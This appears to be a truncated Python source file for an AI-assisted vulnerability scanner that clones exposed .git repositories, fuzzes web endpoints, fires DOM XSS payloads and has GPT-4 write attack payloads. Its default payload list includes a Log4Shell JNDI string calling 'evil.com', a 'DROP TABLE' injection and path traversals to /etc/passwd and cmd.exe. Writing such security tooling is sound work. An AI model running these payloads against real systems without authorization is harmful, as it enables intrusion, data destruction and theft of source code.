import asyncio
import json
import logging
import os
import tempfile
import time
import uuid
import zipfile
from pathlib import Path
from typing import Dict, List, Optional, Any, Set
import hashlib
import subprocess

import httpx
from playwright.async_api import async_playwright, Browser, Page
import openai
from datetime import datetime

from ..core.agent import Agent
from ..core.event_bus import EventBus
from ..core.scope import Scope

log = logging.getLogger(__name__)

class ZeroDayHunterAgent(Agent):
    """AI-powered zero-day vulnerability hunter"""
    
    def __init__(self, bus: EventBus, scope: Scope, budget: int):
        super().__init__(bus, scope, budget)
        self.results = {
            'target': scope.target,
            'static_analysis': [],
            'dynamic_analysis': [],
            'fuzzing_results': [],
            'zero_day_candidates': [],
            'pocs': [],
            'evidence': [],
            'ai_calls_used': 0,
            'timestamp': int(time.time())
        }
        self.budget_used = 0
        self.evidence_dir = Path(f"evidence/{scope.target}_{int(time.time())}")
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
        
        # AI client
        self.openai_client = None
        self.browser = None
        
        # CVE patterns (simplified - in production would be vector DB)
        self.cve_patterns = self._load_cve_patterns()
    
    async def execute(self) -> None:
        """Execute comprehensive zero-day hunting"""
        log.info(f"🎯 Starting AI-powered zero-day hunting on {self.scope.target}")
        
        try:
            # Initialize AI client
            await self._init_ai_client()
            
            # Phase 1: AI-Powered Static Code Analysis
            await self._check_budget("Static analysis")
            await self._static_code_analysis()
            await self._emit_static_results()
            
            # Phase 2: Dynamic Behavioral Analysis
            await self._check_budget("Dynamic analysis")
            await self._dynamic_behavioral_analysis()
            await self._emit_dynamic_results()
            
            # Phase 3: Intelligent Fuzzing
            await self._check_budget("Fuzzing")
            await self._intelligent_fuzzing()
            await self._emit_fuzzing_results()
            
            # Phase 4: Pattern Mining for Novel Vectors
            await self._check_budget("Pattern mining")
            await self._pattern_mining()
            
            # Phase 5: Zero-Day Candidate Analysis
            await self._check_budget("Zero-day analysis")
            await self._analyze_zero_day_candidates()
            await self._emit_candidates()
            
            # Phase 6: Automated PoC Synthesis
            await self._check_budget("PoC synthesis")
            await self._synthesize_pocs()
            await self._emit_pocs()
            
            # Phase 7: Evidence Collection
            await self._collect_evidence()
            await self._emit_evidence()
            
            log.info(f"✅ Zero-day hunting completed for {self.scope.target}")
            
        except Exception as e:
            log.error(f"❌ Zero-day hunting failed: {str(e)}")
            raise
        finally:
            if self.browser:
                await self.browser.close()
    
    async def _init_ai_client(self):
        """Initialize AI client for LLM calls"""
        try:
            api_key = os.getenv('OPENAI_API_KEY')
            if api_key:
                self.openai_client = openai.AsyncOpenAI(api_key=api_key)
                log.info("🤖 AI client initialized")
            else:
                log.warning("⚠️  OpenAI API key not found, using fallback analysis")
        except Exception as e:
            log.warning(f"⚠️  Failed to initialize AI client: {str(e)}")
    
    async def _check_budget(self, operation: str) -> None:
        """Check if budget allows for operation"""
        if self.budget_used >= self.budget:
            raise RuntimeError(f"Budget exceeded during: {operation}")
        log.debug(f"Budget: {self.budget_used}/{self.budget} - {operation}")
    
    async def _static_code_analysis(self) -> None:
        """AI-powered static code analysis"""
        log.info("  🔍 Running AI-powered static analysis...")
        
        try:
            # Step 1: Check if source code is available
            source_paths = await self._discover_source_code()
            
            if source_paths:
                # Step 2: Run Semgrep with AI-generated rules
                semgrep_results = await self._run_semgrep_analysis(source_paths)
                
                # Step 3: Feed findings to LLM for pattern recognition
                if semgrep_results and self.openai_client:
                    ai_analysis = await self._ai_analyze_static_findings(semgrep_results)
                    self.results['static_analysis'].extend(ai_analysis)
                else:
                    self.results['static_analysis'].extend(semgrep_results)
            else:
                # Fallback: Analyze publicly available artifacts
                await self._analyze_public_artifacts()
            
            self.budget_used += 2
            log.info(f"    ✅ Static analysis completed: {len(self.results['static_analysis'])} findings")
            
        except Exception as e:
            log.error(f"    ❌ Static analysis failed: {str(e)}")
    
    async def _discover_source_code(self) -> List[str]:
        """Discover available source code repositories"""
        source_paths = []
        
        # Check for exposed Git repositories
        git_paths = [
            '/.git/config',
            '/.git/HEAD',
            '/.svn/entries',
            '/source.zip',
            '/src.tar.gz'
        ]
        
        base_urls = [f"https://{self.scope.target}", f"http://{self.scope.target}"]
        
        async with httpx.AsyncClient(timeout=10) as client:
            for base_url in base_urls:
                for git_path in git_paths:
                    try:
                        response = await client.get(f"{base_url}{git_path}")
                        if response.status_code == 200:
                            # Download and extract source if available
                            source_dir = await self._download_source_code(base_url, git_path, client)
                            if source_dir:
                                source_paths.append(source_dir)
                                break
                    except Exception:
                        continue
                
                if source_paths:
                    break
        
        return source_paths
    
    async def _download_source_code(self, base_url: str, path: str, client: httpx.AsyncClient) -> Optional[str]:
        """Download and extract source code"""
        try:
            if path.endswith(('.zip', '.tar.gz')):
                # Download archive
                response = await client.get(f"{base_url}{path}")
                if response.status_code == 200:
                    temp_dir = tempfile.mkdtemp()
                    archive_path = Path(temp_dir) / "source.zip"
                    
                    with open(archive_path, 'wb') as f:
                        f.write(response.content)
                    
                    # Extract archive
                    if path.endswith('.zip'):
                        with zipfile.ZipFile(archive_path, 'r') as zip_ref:
                            zip_ref.extractall(temp_dir)
                    
                    return temp_dir
            
            elif '/.git/' in path:
                # Attempt to clone Git repository
                temp_dir = tempfile.mkdtemp()
                git_url = f"{base_url}/.git"
                
                try:
                    process = await asyncio.create_subprocess_exec(
                        'git', 'clone', git_url, temp_dir,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                    )
                    
                    stdout, stderr = await process.communicate()
                    
                    if process.returncode == 0:
                        return temp_dir
                except Exception:
                    pass
            
        except Exception as e:
            log.debug(f"Failed to download source: {str(e)}")
        
        return None
    
    async def _run_semgrep_analysis(self, source_paths: List[str]) -> List[Dict]:
        """Run Semgrep analysis with AI-generated rules"""
        semgrep_results = []
        
        try:
            # Generate AI-powered Semgrep rules
            custom_rules = await self._generate_ai_semgrep_rules()
            
            for source_path in source_paths:
                # Run Semgrep
                cmd = [
                    'semgrep',
                    '--config=auto',
                    '--json',
                    '--no-git-ignore',
                    source_path
                ]
                
                if custom_rules:
                    rules_file = Path(source_path) / 'custom_rules.yml'
                    with open(rules_file, 'w') as f:
                        f.write(custom_rules)
                    cmd.extend(['--config', str(rules_file)])
                
                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                stdout, stderr = await process.communicate()
                
                if process.returncode == 0:
                    results = json.loads(stdout.decode())
                    for finding in results.get('results', []):
                        semgrep_results.append({
                            'type': 'semgrep',
                            'rule_id': finding.get('check_id'),
                            'message': finding.get('message'),
                            'severity': finding.get('extra', {}).get('severity', 'INFO'),
                            'file': finding.get('path'),
                            'line': finding.get('start', {}).get('line'),
                            'code': finding.get('extra', {}).get('lines', '')
                        })
                
        except FileNotFoundError:
            log.warning("    ⚠️  Semgrep not found, using basic static analysis")
            semgrep_results = await self._basic_static_analysis(source_paths)
        except Exception as e:
            log.warning(f"    ⚠️  Semgrep analysis failed: {str(e)}")
        
        return semgrep_results
    
    async def _generate_ai_semgrep_rules(self) -> Optional[str]:
        """Generate custom Semgrep rules using AI"""
        if not self.openai_client:
            return None
        
        try:
            prompt = f"""Generate custom Semgrep rules for detecting zero-day vulnerabilities in web applications targeting {self.scope.target}.
            
Focus on:
1. Novel injection patterns
2. Authentication bypasses
3. Authorization flaws
4. Input validation issues
5. Business logic vulnerabilities

Return only valid YAML Semgrep rules."""

            response = await self.openai_client.chat.completions.create(
                model="gpt-4",
                messages=[
                    {"role": "system", "content": "You are a security expert generating Semgrep rules for zero-day detection."},
                    {"role": "user", "content": prompt}
                ],
                max_tokens=2000,
                temperature=0.7
            )
            
            self.results['ai_calls_used'] += 1
            return response.choices[0].message.content
            
        except Exception as e:
            log.warning(f"    ⚠️  AI rule generation failed: {str(e)}")
            return None
    
    async def _basic_static_analysis(self, source_paths: List[str]) -> List[Dict]:
        """Basic static analysis fallback"""
        findings = []
        
        dangerous_patterns = [
            (r'eval\s*\(', 'Code Injection', 'HIGH'),
            (r'exec\s*\(', 'Code Execution', 'HIGH'),
            (r'system\s*\(', 'Command Injection', 'HIGH'),
            (r'shell_exec\s*\(', 'Command Injection', 'HIGH'),
            (r'file_get_contents\s*\(\s*\$_', 'File Inclusion', 'MEDIUM'),
            (r'include\s*\(\s*\$_', 'File Inclusion', 'HIGH'),
            (r'require\s*\(\s*\$_', 'File Inclusion', 'HIGH'),
            (r'SELECT.*FROM.*WHERE.*\$_', 'SQL Injection', 'HIGH'),
            (r'INSERT.*INTO.*VALUES.*\$_', 'SQL Injection', 'HIGH'),
        ]
        
        for source_path in source_paths:
            source_dir = Path(source_path)
            for file_path in source_dir.rglob('*.php'):
                try:
                    content = file_path.read_text(encoding='utf-8', errors='ignore')
                    
                    for pattern, vuln_type, severity in dangerous_patterns:
                        import re
                        matches = re.finditer(pattern, content, re.IGNORECASE)
                        
                        for match in matches:
                            line_num = content[:match.start()].count('\n') + 1
                            findings.append({
                                'type': 'static_pattern',
                                'vulnerability': vuln_type,
                                'severity': severity,
                                'file': str(file_path),
                                'line': line_num,
                                'pattern': pattern,
                                'match': match.group()
                            })
                            
                except Exception:
                    continue
        
        return findings
    
    async def _analyze_public_artifacts(self) -> None:
        """Analyze publicly available artifacts for vulnerabilities"""
        try:
            # Analyze JavaScript files for client-side vulnerabilities
            js_files = await self._discover_js_files()
            js_findings = await self._analyze_js_vulnerabilities(js_files)
            self.results['static_analysis'].extend(js_findings)
            
            # Analyze API endpoints for potential issues
            api_findings = await self._analyze_api_endpoints()
            self.results['static_analysis'].extend(api_findings)
            
        except Exception as e:
            log.warning(f"    ⚠️  Public artifact analysis failed: {str(e)}")
    
    async def _discover_js_files(self) -> List[str]:
        """Discover JavaScript files on the target"""
        js_files = []
        
        base_urls = [f"https://{self.scope.target}", f"http://{self.scope.target}"]
        
        async with httpx.AsyncClient(timeout=10) as client:
            for base_url in base_urls:
                try:
                    response = await client.get(base_url)
                    if response.status_code == 200:
                        # Extract JS file URLs
                        import re
                        js_pattern = r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']'
                        matches = re.findall(js_pattern, response.text, re.IGNORECASE)
                        
                        for match in matches:
                            if match.startswith('http'):
                                js_files.append(match)
                            elif match.startswith('/'):
                                js_files.append(f"{base_url}{match}")
                        
                        break
                except Exception:
                    continue
        
        return js_files[:10]  # Limit to 10 files
    
    async def _analyze_js_vulnerabilities(self, js_files: List[str]) -> List[Dict]:
        """Analyze JavaScript files for vulnerabilities"""
        findings = []
        
        vulnerable_patterns = [
            (r'eval\s*\(', 'JavaScript Code Injection', 'HIGH'),
            (r'innerHTML\s*=.*\+', 'XSS Vulnerability', 'MEDIUM'),
            (r'document\.write\s*\(.*\+', 'XSS Vulnerability', 'MEDIUM'),
            (r'location\.href\s*=.*\+', 'Open Redirect', 'MEDIUM'),
            (r'window\.open\s*\(.*\+', 'Open Redirect', 'LOW'),
            (r'postMessage\s*\(', 'PostMessage Vulnerability', 'MEDIUM'),
            (r'localStorage\s*\[\s*["\'].*["\']', 'Sensitive Data Storage', 'LOW'),
        ]
        
        async with httpx.AsyncClient(timeout=10) as client:
            for js_url in js_files:
                try:
                    response = await client.get(js_url)
                    if response.status_code == 200:
                        content = response.text
                        
                        for pattern, vuln_type, severity in vulnerable_patterns:
                            import re
                            matches = re.finditer(pattern, content, re.IGNORECASE)
                            
                            for match in matches:
                                line_num = content[:match.start()].count('\n') + 1
                                findings.append({
                                    'type': 'js_vulnerability',
                                    'vulnerability': vuln_type,
                                    'severity': severity,
                                    'url': js_url,
                                    'line': line_num,
                                    'pattern': pattern,
                                    'context': content[max(0, match.start()-50):match.end()+50]
                                })
                                
                except Exception:
                    continue
        
        return findings
    
    async def _analyze_api_endpoints(self) -> List[Dict]:
        """Analyze API endpoints for potential vulnerabilities"""
        findings = []
        
        api_paths = [
            '/api', '/api/v1', '/api/v2', '/rest',
            '/graphql', '/admin/api', '/internal/api'
        ]
        
        base_urls = [f"https://{self.scope.target}", f"http://{self.scope.target}"]
        
        async with httpx.AsyncClient(timeout=10) as client:
            for base_url in base_urls:
                for api_path in api_paths:
                    try:
                        url = f"{base_url}{api_path}"
                        
                        # Test for common API vulnerabilities
                        test_results = await self._test_api_vulnerabilities(client, url)
                        findings.extend(test_results)
                        
                    except Exception:
                        continue
                
                if findings:  # Found working base URL
                    break
        
        return findings
    
    async def _test_api_vulnerabilities(self, client: httpx.AsyncClient, url: str) -> List[Dict]:
        """Test API endpoint for common vulnerabilities"""
        findings = []
        
        try:
            # Test 1: Basic endpoint access
            response = await client.get(url)
            if response.status_code < 400:
                # Check for information disclosure
                if any(keyword in response.text.lower() for keyword in 
                       ['error', 'exception', 'stack trace', 'debug', 'sql']):
                    findings.append({
                        'type': 'api_vulnerability',
                        'vulnerability': 'Information Disclosure',
                        'severity': 'MEDIUM',
                        'url': url,
                        'method': 'GET',
                        'evidence': response.text[:500]
                    })
                
                # Test 2: HTTP method tampering
                for method in ['PUT', 'DELETE', 'PATCH']:
                    try:
                        test_response = await client.request(method, url)
                        if test_response.status_code not in [405, 501]:
                            findings.append({
                                'type': 'api_vulnerability',
                                'vulnerability': f'Unexpected {method} Method Allowed',
                                'severity': 'MEDIUM',
                                'url': url,
                                'method': method,
                                'status_code': test_response.status_code
                            })
                    except Exception:
                        continue
                
                # Test 3: Parameter pollution
                test_params = {'id': ['1', '2'], 'admin': 'true'}
                try:
                    pollution_response = await client.get(url, params=test_params)
                    if pollution_response.text != response.text:
                        findings.append({
                            'type': 'api_vulnerability',
                            'vulnerability': 'HTTP Parameter Pollution',
                            'severity': 'MEDIUM',
                            'url': url,
                            'params': test_params
                        })
                except Exception:
                    pass
        
        except Exception:
            pass
        
        return findings
    
    async def _ai_analyze_static_findings(self, findings: List[Dict]) -> List[Dict]:
        """Use AI to analyze static findings for novel patterns"""
        if not self.openai_client or not findings:
            return findings
        
        try:
            # Prepare findings summary for AI analysis
            findings_summary = json.dumps(findings[:20], indent=2)  # Limit to 20 findings
            
            prompt = f"""Analyze these static analysis findings for potential zero-day vulnerabilities:

{findings_summary}

For each finding, provide:
1. Severity assessment (CRITICAL/HIGH/MEDIUM/LOW)
2. Exploitability analysis
3. Novel attack vector identification
4. Zero-day potential (0-100%)

Return JSON with enhanced findings."""

            response = await self.openai_client.chat.completions.create(
                model="gpt-4",
                messages=[
                    {"role": "system", "content": "You are a security expert analyzing code for zero-day vulnerabilities."},
                    {"role": "user", "content": prompt}
                ],
                max_tokens=3000,
                temperature=0.3
            )
            
            self.results['ai_calls_used'] += 1
            
            # Parse AI response
            ai_content = response.choices[0].message.content
            if ai_content.startswith('```json'):
                ai_content = ai_content.split('```json')[1].split('```')[0]
            elif ai_content.startswith('```'):
                ai_content = ai_content.split('```')[1].split('```')[0]
            
            try:
                enhanced_findings = json.loads(ai_content)
                if isinstance(enhanced_findings, list):
                    return enhanced_findings
            except json.JSONDecodeError:
                pass
            
            # Fallback: enhance original findings
            for finding in findings:
                finding['ai_analysis'] = 'AI analysis completed'
                finding['zero_day_potential'] = 'Unknown'
            
            return findings
            
        except Exception as e:
            log.warning(f"    ⚠️  AI static analysis failed: {str(e)}")
            return findings
    
    async def _dynamic_behavioral_analysis(self) -> None:
        """Dynamic behavioral analysis using headless browser"""
        log.info("  🎭 Running dynamic behavioral analysis...")
        
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    args=['--no-sandbox', '--disable-setuid-sandbox']
                )
                self.browser = browser
                
                page = await browser.new_page()
                
                # Enable request/response interception
                await page.route("**/*", self._intercept_request)
                
                # Instrument JavaScript runtime
                await self._instrument_js_runtime(page)
                
                # Navigate to target and analyze behavior
                await self._analyze_page_behavior(page)
                
                # Test for client-side vulnerabilities
                await self._test_client_side_vulns(page)
                
                await browser.close()
                
            self.budget_used += 3
            log.info(f"    ✅ Dynamic analysis completed: {len(self.results['dynamic_analysis'])} findings")
            
        except Exception as e:
            log.error(f"    ❌ Dynamic analysis failed: {str(e)}")
    
    async def _intercept_request(self, route):
        """Intercept and analyze HTTP requests/responses"""
        try:
            request = route.request
            
            # Continue the request
            response = await route.continue_()
            
            # Analyze request for suspicious patterns
            if request.method in ['POST', 'PUT'] and request.post_data:
                await self._analyze_request_data(request)
            
        except Exception:
            await route.continue_()
    
    async def _analyze_request_data(self, request):
        """Analyze request data for vulnerabilities"""
        try:
            post_data = request.post_data
            
            # Check for potential injection points
            if any(pattern in post_data.lower() for pattern in 
                   ['<script', 'javascript:', 'eval(', 'union select']):
                self.results['dynamic_analysis'].append({
                    'type': 'suspicious_request',
                    'url': request.url,
                    'method': request.method,
                    'data': post_data[:500],  # Limit data size
                    'vulnerability': 'Potential Injection Point',
                    'severity': 'MEDIUM'
                })
        
        except Exception:
            pass
    
    async def _instrument_js_runtime(self, page: Page) -> None:
        """Instrument JavaScript runtime to capture dangerous calls"""
        try:
            # Override dangerous JavaScript functions
            js_instrumentation = """
            window._security_monitor = {
                calls: [],
                originalEval: window.eval,
                originalSetTimeout: window.setTimeout,
                originalSetInterval: window.setInterval
            };
            
            // Monitor eval calls
            window.eval = function(code) {
                window._security_monitor.calls.push({
                    type: 'eval',
                    code: code,
                    stack: new Error().stack,
                    timestamp: Date.now()
                });
                return window._security_monitor.originalEval(code);
            };
            
            // Monitor setTimeout calls
            window.setTimeout = function(code, delay) {
                if (typeof code === 'string') {
                    window._security_monitor.calls.push({
                        type: 'setTimeout',
                        code: code,
                        delay: delay,
                        stack: new Error().stack,
                        timestamp: Date.now()
                    });
                }
                return window._security_monitor.originalSetTimeout(code, delay);
            };
            
            // Monitor innerHTML assignments
            Object.defineProperty(Element.prototype, 'innerHTML', {
                set: function(value) {
                    if (typeof value === 'string' && value.includes('<')) {
                        window._security_monitor.calls.push({
                            type: 'innerHTML',
                            value: value,
                            element: this.tagName,
                            stack: new Error().stack,
                            timestamp: Date.now()
                        });
                    }
                    this._innerHTML = value;
                },
                get: function() {
                    return this._innerHTML;
                }
            });
            """
            
            await page.add_init_script(js_instrumentation)
            
        except Exception as e:
            log.warning(f"    ⚠️  JS instrumentation failed: {str(e)}")
    
    async def _analyze_page_behavior(self, page: Page) -> None:
        """Analyze page behavior for anomalies"""
        try:
            # Navigate to target
            base_urls = [f"https://{self.scope.target}", f"http://{self.scope.target}"]
            
            for base_url in base_urls:
                try:
                    await page.goto(base_url, timeout=30000)
                    
                    # Wait for page to load
                    await page.wait_for_timeout(3000)
                    
                    # Check for JavaScript errors
                    js_errors = await page.evaluate("window._security_monitor ? window._security_monitor.calls : []")
                    
                    for error in js_errors:
                        self.results['dynamic_analysis'].append({
                            'type': 'js_runtime_anomaly',
                            'call_type': error.get('type'),
                            'details': error,
                            'severity': 'HIGH' if error.get('type') == 'eval' else 'MEDIUM',
                            'url': base_url
                        })
                    
                    # Test for DOM-based vulnerabilities
                    await self._test_dom_vulns(page, base_url)
                    
                    break  # Successfully analyzed one URL
                    
                except Exception:
                    continue
        
        except Exception as e:
            log.warning(f"    ⚠️  Page behavior analysis failed: {str(e)}")
    
    async def _test_dom_vulns(self, page: Page, base_url: str) -> None:
        """Test for DOM-based vulnerabilities"""
        try:
            # Test for DOM XSS
            xss_payloads = [
                "#<img src=x onerror=alert(1)>",
                "#javascript:alert(1)",
                "?q=<script>alert(1)</script>"
            ]
            
            for payload in xss_payloads:
                try:
                    test_url = f"{base_url}{payload}"
                    await page.goto(test_url, timeout=10000)
                    
                    # Check if payload executed
                    alerts = []
                    
                    def handle_dialog(dialog):
                        alerts.append(dialog.message)
                        asyncio.create_task(dialog.dismiss())
                    
                    page.on("dialog", handle_dialog)
                    
                    await page.wait_for_timeout(2000)
                    
                    if alerts:
                        self.results['dynamic_analysis'].append({
                            'type': 'dom_xss',
                            'payload': payload,
                            'url': test_url,
                            'severity': 'HIGH',
                            'evidence': f"Alert triggered: {alerts[0]}"
                        })
                        
                except Exception:
                    continue
        
        except Exception:
            pass
    
    async def _test_client_side_vulns(self, page: Page) -> None:
        """Test for client-side vulnerabilities"""
        try:
            # Test for sensitive data in localStorage/sessionStorage
            storage_data = await page.evaluate("""
                () => {
                    const data = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        data[key] = localStorage.getItem(key);
                    }
                    return data;
                }
            """)
            
            for key, value in storage_data.items():
                if any(sensitive in key.lower() for sensitive in 
                       ['password', 'token', 'secret', 'api_key', 'session']):
                    self.results['dynamic_analysis'].append({
                        'type': 'sensitive_data_storage',
                        'storage_type': 'localStorage',
                        'key': key,
                        'value_sample': str(value)[:50],
                        'severity': 'HIGH'
                    })
            
            # Test for WebSocket connections
            websocket_info = await page.evaluate("""
                () => {
                    const connections = [];
                    const originalWebSocket = window.WebSocket;
                    
                    window.WebSocket = function(url, protocols) {
                        connections.push({url: url, protocols: protocols});
                        return new originalWebSocket(url, protocols);
                    };
                    
                    return connections;
                }
            """)
            
            for ws_info in websocket_info:
                self.results['dynamic_analysis'].append({
                    'type': 'websocket_discovery',
                    'url': ws_info['url'],
                    'protocols': ws_info.get('protocols'),
                    'severity': 'INFO'
                })
        
        except Exception:
            pass
    
    async def _intelligent_fuzzing(self) -> None:
        """Intelligent fuzzing with AI-generated inputs"""
        log.info("  🎲 Running intelligent fuzzing...")
        
        try:
            # Discover fuzzable endpoints
            endpoints = await self._discover_fuzz_targets()
            
            # Generate AI-powered fuzzing payloads
            ai_payloads = await self._generate_ai_fuzz_payloads()
            
            # Execute fuzzing campaign
            for endpoint in endpoints[:5]:  # Limit for budget
                await self._fuzz_endpoint(endpoint, ai_payloads)
            
            self.budget_used += 4
            log.info(f"    ✅ Fuzzing completed: {len(self.results['fuzzing_results'])} anomalies")
            
        except Exception as e:
            log.error(f"    ❌ Fuzzing failed: {str(e)}")
    
    async def _discover_fuzz_targets(self) -> List[Dict]:
        """Discover endpoints suitable for fuzzing"""
        fuzz_targets = []
        
        # Common fuzzable paths
        fuzz_paths = [
            '/api/user', '/api/login', '/api/search',
            '/upload', '/file', '/download',
            '/admin', '/dashboard', '/profile',
            '/?q=', '/?search=', '/?id='
        ]
        
        base_urls = [f"https://{self.scope.target}", f"http://{self.scope.target}"]
        
        async with httpx.AsyncClient(timeout=10) as client:
            for base_url in base_urls:
                for fuzz_path in fuzz_paths:
                    try:
                        url = f"{base_url}{fuzz_path}"
                        response = await client.get(url)
                        
                        if response.status_code < 500:
                            fuzz_targets.append({
                                'url': url,
                                'method': 'GET',
                                'baseline_response': {
                                    'status': response.status_code,
                                    'length': len(response.content),
                                    'time': response.elapsed.total_seconds()
                                }
                            })
                            
                    except Exception:
                        continue
                
                if fuzz_targets:
                    break
        
        return fuzz_targets
    
    async def _generate_ai_fuzz_payloads(self) -> List[str]:
        """Generate AI-powered fuzzing payloads"""
        if not self.openai_client:
            return self._get_default_fuzz_payloads()
        
        try:
            prompt = f"""Generate advanced fuzzing payloads for web application security testing targeting {self.scope.target}.
            
Include payloads for:
1. SQL injection variants
2. XSS bypass techniques  
3. Command injection
4. Path traversal
5. Buffer overflow attempts
6. Logic bomb triggers
7. Race condition exploits

Return 30 diverse payloads as a JSON array."""

            response = await self.openai_client.chat.completions.create(
                model="gpt-4",
                messages=[
                    {"role": "system", "content": "You are a security expert generating fuzzing payloads."},
                    {"role": "user", "content": prompt}
                ],
                max_tokens=2000,
                temperature=0.8
            )
            
            self.results['ai_calls_used'] += 1
            
            # Parse AI response
            ai_content = response.choices[0].message.content
            if ai_content.startswith('```json'):
                ai_content = ai_content.split('```json')[1].split('```')[0]
            elif ai_content.startswith('```'):
                ai_content = ai_content.split('```')[1].split('```')[0]
            
            try:
                payloads = json.loads(ai_content)
                if isinstance(payloads, list):
                    return payloads
            except json.JSONDecodeError:
                pass
                
        except Exception as e:
            log.warning(f"    ⚠️  AI payload generation failed: {str(e)}")
        
        return self._get_default_fuzz_payloads()
    
    def _get_default_fuzz_payloads(self) -> List[str]:
        """Get default fuzzing payloads"""
        return [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "%0a%0dSet-Cookie:test=value",
            "A" * 1000,
            "null",
            "-1",
            "0x0",
            "../../../windows/system32/cmd.exe",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "';waitfor delay '00:00:05'--"
        ]
    
    async def _fuzz_endpoint(self, endpoint: Dict, payloads: List[str]) -> None:
        """Fuzz a specific endpoint"""
        try:
            baseline = endpoint['baseline_response']
            
            async with httpx.AsyncClient(timeout=30) as client:
                for payload in payloads:
                    try:
                        # Test different parameter positions
                        fuzz_urls = [
                            f"{endpoint['url']}{payload}",
                            endpoint['url'].replace('=', f'={payload}'),
                            endpoint['url']
                        ]
                        
                        for fuzz_url in fuzz_urls:
                            start_time = time.time()
                            
                            if endpoint['method'] == 'GET':
                                response = await client.get(fuzz_url)
                            else:
                                response = await client.post(fuzz_url, data={'payload': payload})
                            
                            response_time = time.time() - start_time
                            
                            # Detect anomalies
                            anomaly = self._detect_fuzz_anomaly(
                                response, baseline, response_time, payload
                            )
                            
                            if anomaly:
                                self.results['fuzzing_results'].append({
                                    'endpoint': fuzz_url,
                                    'payload': payload,
                                    'anomaly': anomaly,
                                    'response_code': response.status_code,
                                    'response_time': response_time,
                                    'response_size': len(response.content)
                                })
                    
                    except Exception as e:
                        # Timeout or error might indicate DoS
                        if 'timeout' in str(e).lower():
                            self.results['fuzzing_results'].append({
                                'endpoint': endpoint['url'],
                                'payload': payload,
                                'anomaly': 'timeout_dos',
                                'error': str(e)
                            })
        
        except Exception:
            pass
    
    def _detect_fuzz_anomaly(self, response, baseline: Dict, response_time: float, payload: str) -> Optional[str]:
        """Detect anomalies in fuzzing response"""
        
        # Error-based detection
        if response.status_code >= 500 and baseline['status'] < 500:
            return 'server_error'
        
        # Time-based detection (potential SQL injection)
        if response_time > baseline['time'] * 3 and response_time > 5:
            return 'time_based_injection'
        
        # Size-based detection
        if len(response.content) > baseline['length'] * 2:
            return 'response_size_anomaly'
        
        # Content-based detection
        content_lower = response.text.lower()
        error_indicators = [
            'sql syntax', 'mysql error', 'postgresql error',
            'oracle error', 'syntax error', 'warning:',
            'fatal error', 'stack trace', 'exception'
        ]
        
        if any(indicator in content_lower for indicator in error_indicators):
            return 'error_disclosure'
        
        # XSS reflection detection
        if payload.lower() in content_lower and '<script' in payload.lower():
            return 'xss_reflection'
        
        return None
    
    async def _pattern_mining(self) -> None:
        """Mine patterns for novel attack vectors"""
        log.info("  🔍 Mining patterns for novel vectors...")
        
        try:
            # Collect all findings for pattern analysis
            all_findings = (
                self.results['static_analysis'] +
                self.results['dynamic_analysis'] +
                self.results['fuzzing_results']
            )
            
            if all_findings and self.openai_client:
                # Use AI to identify novel patterns
                novel_patterns = await self._ai_pattern_analysis(all_findings)
                self.results['novel_patterns'] = novel_patterns
            
            self.budget_used += 1
            
        except Exception as e:
            log.error(f"    ❌ Pattern mining failed: {str(e)}")
    
    async def _ai_pattern_analysis(self, findings: List[Dict]) -> List[Dict]:
        """Use AI to analyze patterns for novel attack vectors"""
        try:
            findings_summary = json.dumps(findings[:30], indent=2)
            
            prompt = f"""Analyze these security findings for novel attack patterns and zero-day potential:

{findings_summary}

Compare against known CVE patterns and identify:
1. Unique vulnerability combinations
2. Novel attack vectors
3. Zero-day candidates (high novelty score)
4. Exploit chain opportunities

Return JSON with novel pattern analysis."""

            response = await self.openai_client.chat.completions.create(
                model="gpt-4",
                messages=[
                    {"role": "system", "content": "You are a security researcher identifying novel attack patterns."},
                    {"role": "user", "content": prompt}
                ],
                max_tokens=3000,
                temperature=0.5
            )
            
            self.results['ai_calls_used'] += 1
            
            # Parse AI response
            ai_content = response.choices[0].message.content
            if ai_content.startswith('```json'):
                ai_content = ai_content.split('```json')[1].split('```')[0]
            
            try:
                return json.loads(ai_content)
            except json.JSONDecodeError:
                return [{'analysis': ai_content}]
                
        except Exception as e:
            log.warning(f"    ⚠️  AI pattern analysis failed: {str(e)}")
            return []
    
    def _load_cve_patterns(self) -> List[Dict]:
        """Load CVE patterns for comparison (simplified)"""
        # In production, this would load from vector database
        return [
            {'id': 'CVE-2021-44228', 'pattern': 'log4j', 'type': 'rce'},
            {'id': 'CVE-2021-34527', 'pattern': 'print spooler', 'type': 'lpe'},
            {'id': 'CVE-2022-0778', 'pattern': 'openssl', 'type': 'dos'},
        ]
    
    async def _analyze_zero_day_candidates(self) -> None:
        """Analyze findings for zero-day candidates"""
        log.info("  🎯 Analyzing zero-day candidates...")
        
        try:
            # Score findings based on novelty and exploitability
            candidates = []
            
            all_findings = (
                self.results['static_analysis'] +
                self.results['dynamic_analysis'] +
                self.results['fuzzing_results']
            )
            
            for finding in all_findings:
                score = self._calculate_zero_day_score(finding)
                if score >= 70:  # High threshold for zero-day candidates
                    candidates.append({
                        **finding,
                        'zero_day_score': score,
                        'candidate_id': f"CVE-ZERO-{len(candidates)+1:03d}",
                        'discovery_timestamp': int(time.time())
                    })
            
            self.results['zero_day_candidates'] = candidates
            self.budget_used += 1
            
        except Exception as e:
            log.error(f"    ❌ Zero-day analysis failed: {str(e)}")
    
    def _calculate_zero_day_score(self, finding: Dict) -> int:
        """Calculate zero-day potential score"""
        score = 0
        
        # Base score by severity
        severity_scores = {'CRITICAL': 40, 'HIGH': 30, 'MEDIUM': 20, 'LOW': 10}
        score += severity_scores.get(finding.get('severity', 'LOW'), 10)
        
        # Novelty indicators
        if 'novel' in str(finding).lower():
            score += 20
        
        if 'unknown' in str(finding).lower():
            score += 15
        
        # Exploitability indicators
        if finding.get('type') in ['server_error', 'time_based_injection', 'xss_reflection']:
            score += 25
        
        if 'eval' in str(finding).lower() or 'injection' in str(finding).lower():
